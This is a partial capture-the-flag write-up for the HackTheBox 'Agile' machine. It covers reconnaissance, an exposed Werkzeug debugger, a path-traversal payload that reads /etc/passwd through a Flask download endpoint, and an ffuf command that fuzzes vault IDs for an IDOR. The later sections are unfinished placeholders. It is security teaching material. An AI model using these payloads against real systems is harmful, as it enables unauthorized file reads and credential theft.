# HackTheBox — Agile

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: werkzeug-debug, idor, lfi, flask](https://img.shields.io/badge/Tags-Werkzeug%20Debug%20%7C%20IDOR%20%7C%20LFI%20%7C%20Flask-orange)

> 🚧 **[partial — original has reconnaissance, source code, an exposed Werkzeug debugger trace, and an in-flight ffuf command; full chain narrative needs filling]**

---

## Attack Chain at a Glance

```
nmap → 80 nginx (superpass.htb, test.superpass.htb)
   → DEBUG=True / Werkzeug debugger exposed → console RCE OR
     debugger-driven introspection → LFI primitive (/download?fn=...)
   → /etc/passwd reveals: corum, runner, edwards, dev_admin
   → IDOR/IDOR-fuzz on /vault/row/<id> (numbers.txt fuzz)
     → leak other users' passwords from the vault DB
   → 🚧 [path to user.txt — likely SSH as one of the users with their leaked password]
   → 🚧 [privesc chain]
   → 🚧 [root]
```

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- -Pn --min-rate=5000 -oN nmap.txt 10.129.228.212
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
```

Vhosts in `/etc/hosts` (extracted later via LFI):

```
127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile
```

Two named vhosts: `superpass.htb` (production) and `test.superpass.htb` (dev).

---

## Initial Foothold

### Triggering the Werkzeug Debugger

Registering a username triggered a SQL operational error that **exposed the Werkzeug debugger** with full traceback and an interactive Python console:

<details>
<summary>Click to expand traceback</summary>

```
OperationalError
sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError)
(2013, 'Lost connection to MySQL server during query')
[SQL: SELECT users.id AS users_id, users.username AS users_username,
            users.hashed_password AS users_hashed_password
      FROM users
      WHERE users.username = %(username_1)s
       LIMIT %(param_1)s]
[parameters: {'username_1': 'user', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)

  File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1900, in _execute_context
  ...
  File "/app/superpass/views/account_views.py", line 35, in register_post
    user = user_service.create_user(username, password)
  File "/app/superpass/services/user_service.py", line 8, in create_user
    if get_user_by_name(username):
  File "/app/superpass/services/user_service.py", line 36, in get_user_by_name
    tmp = session.query(User).filter(User.username == username).first()
  ...

Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.
```

</details>

> 💡 **Werkzeug's interactive debugger** ("DON'T PANIC" branding) is RCE if you have the PIN — and a *huge* information leak even without it. The traceback alone reveals the full source-tree layout (`/app/superpass/...`), which makes the LFI-friendly endpoint downstream actually useful.

### LFI via `/download?fn=`

The `/download` endpoint passes `fn` directly into `open(f'/tmp/{fn}', 'rb')`:

```python
@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

`fn=../../../../etc/passwd` traverses out of `/tmp` and reads any file. Pull `/etc/passwd`:

<details>
<summary>Click to expand</summary>

```
... (system users) ...
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

</details>

Four human accounts: **`corum`, `runner`, `edwards`, `dev_admin`**.

### Vault Source Code (the application)

<details>
<summary>Click to expand vault.py blueprint</summary>

```python
import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)
    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)
    return {"p": password}


# ... add_row_post / update / delete / export / download omitted for brevity ...
```

</details>

> 💡 **The IDOR is in `/vault/row/<id>`** and `/vault/edit_row/<id>`. Both call `get_password_by_id(id, current_user.id)` — the `current_user.id` filter is the only thing protecting other users' passwords. If `get_password_by_id` doesn't actually use the user-id filter (or filters incorrectly), iterating `<id>` leaks every vault row.

### Fuzzing for Vault IDs

```bash
ffuf -w /home/wakefieldite/numbers.txt \
     -u "http://superpass.htb/vault/row/FUZZ" \
     -replay-proxy=http://127.0.0.1:8080 \
     -b "session=.eJwljs1qwzAQhF9F7DkUr9aSvX6K..." \
     -b "remember_token=9|0ed21808e8403246bb3e4ab276e8bb5f2fcc8fb77c96b4f476a968b4a98f1b9d0afef415045f43f636914288f2973992f87f71b1b619f0255565a3a8d1a756cf"
```

> 🚧 **[gap]** — what came back from this fuzz, which user the leaked password worked for, and how the SSH foothold lands.

---

## User Flag

> 🚧 **[incomplete]**

---

## Privilege Escalation

> 🚧 **[incomplete]**. The `runner` user with home `/app/app-testing/` and shell `/bin/sh` strongly suggests a CI/test pipeline running as a privileged user — likely the privesc vector. The `_laurel` audit user implies anything noisy will be logged.

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

> 🚧 **[incomplete]**. Candidate themes:
> - **Werkzeug debugger in production = game over.** Even without the PIN, the traceback browser hands you the source layout for free.
> - **`open(f"/tmp/{fn}")` with a user-controlled `fn` is the textbook LFI sink.** No amount of `endswith('.csv')` checks would help here — there isn't even one.
> - **Authorization checks should be at the query layer, not the controller.** If `get_password_by_id` accepts a user_id but doesn't enforce it, the `current_user.id` argument is decorative.
> - **`/etc/hosts` after foothold is a vhost-discovery cheat sheet** — production and dev split is common and rarely properly isolated.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port discovery |
| [`ffuf`](https://github.com/ffuf/ffuf) | Brute-forcing vault row IDs |
| [Werkzeug debugger](https://werkzeug.palletsprojects.com/en/latest/debug/) | Debugger traceback + (potentially) console RCE |
